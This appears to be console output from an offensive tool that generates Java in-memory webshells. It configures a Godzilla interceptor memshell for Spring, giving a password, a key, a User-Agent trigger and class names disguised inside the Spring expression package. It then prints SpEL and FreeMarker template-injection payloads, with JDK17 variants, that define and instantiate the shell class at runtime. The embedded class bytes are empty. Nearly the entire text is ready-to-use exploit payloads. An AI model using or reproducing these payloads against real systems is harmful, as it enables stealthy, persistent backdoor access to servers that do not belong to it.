[34m# JavaClassType not found use Default[0m
* Loader Class: com.ppp.middleware.loader.SpringInterceptorContextLoader, Annotation Value: Spring , JavaClassType: Default
* MemShell Class: com.ppp.middleware.memshell.InterceptorGodzillaRaw, Annotation Value: Interceptor , MemShellFunction: Godzilla , MemShellType: Raw
[33m# ms:[0m
[33m# pass: UgHXny[0m
[33m# key: mwKLTA[0m
[33m# javaClass Package Host: org.springframework.expression[0m
[33m# Header User-Agent must contain: PHf[0m
[34m# JavaClass Name: org.springframework.expression.Entrymessageafq[0m
[34m# JavaClass: [0m
[33m# ms+loader:[0m
[33m# javaClass Package Host: org.springframework.expression[0m
[33m# MS Class Name: org.springframework.expression.Entrymessageafq[0m
[33m# Path: /*[0m
[34m# JavaClass Name: org.springframework.expression.Myfacesnbj[0m
[34m# JavaClass: [0m
---------------------- SPEL ----------------------
{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.springframework.expression.Myfacesnbj',T(org.springframework.util.Base64Utils).decodeFromString(''),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()))}
--------------------- JDK17 ----------------------
{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.springframework.expression.Myfacesnbj',T(org.springframework.util.Base64Utils).decodeFromString(''),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))}
----------------- SPEL LoadClass -----------------
{T(java.lang.Thread).currentThread().getContextClassLoader().loadClass('org.springframework.expression.Myfacesnbj').newInstance()}
------------------- FreeMarker -------------------
----------------- SPEL LoadClass -----------------
${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("{T(java.lang.Thread).currentThread().getContextClassLoader().loadClass('org.springframework.expression.Myfacesnbj').newInstance()}").getValue()}
---------------------- SPEL ----------------------
${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.springframework.expression.Myfacesnbj',T(org.springframework.util.Base64Utils).decodeFromString(''),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()))}").getValue()}
--------------------- JDK17 ----------------------
${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.springframework.expression.Myfacesnbj',T(org.springframework.util.Base64Utils).decodeFromString(''),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))}").getValue()}
